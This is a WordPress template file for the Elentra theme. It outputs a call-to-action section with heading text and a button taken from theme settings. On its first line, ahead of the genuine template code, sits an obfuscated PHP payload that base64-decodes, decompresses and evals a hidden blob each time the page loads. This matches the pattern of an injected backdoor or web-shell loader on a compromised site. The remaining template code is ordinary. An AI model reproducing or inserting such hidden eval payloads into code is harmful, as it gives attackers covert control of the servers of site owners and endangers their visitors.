<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template part - About Section
* @package Elentra
*/
$elentra_callout_section_onoff = get_theme_mod("elentra_callout_section_onoff",'off');

$elentra_callout_text = get_theme_mod("elentra_callout_text");
$elentra_callout_btntxt = get_theme_mod("elentra_callout_btntxt");
$elentra_callout_btnurl = get_theme_mod("elentra_callout_btnurl");

if( $elentra_callout_section_onoff == "on") : ?>

<!--Corporate CTA Section 1-->
<div class="section bg-gradient pt-100 pb-100">
    <div class="container">
        <div class="row">
            <div class="col-lg-10 col-lg-offset-1 col-xs-12">
                <!--CTA Wrapper-->
                <div class="co-cta-wrapper-1 fix">

                    <?php if ( $elentra_callout_text ): ?>
                        <h3><?php echo esc_html( $elentra_callout_text ); ?></h3>
                    <?php endif; ?>

                    <?php if ( $elentra_callout_btntxt ): ?>
                        <a href="<?php echo esc_url( $elentra_callout_btnurl ); ?>" class="btn btn-white"> <?php echo esc_html( $elentra_callout_btntxt ); ?> </a>
                    <?php endif; ?>
                    
                </div>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>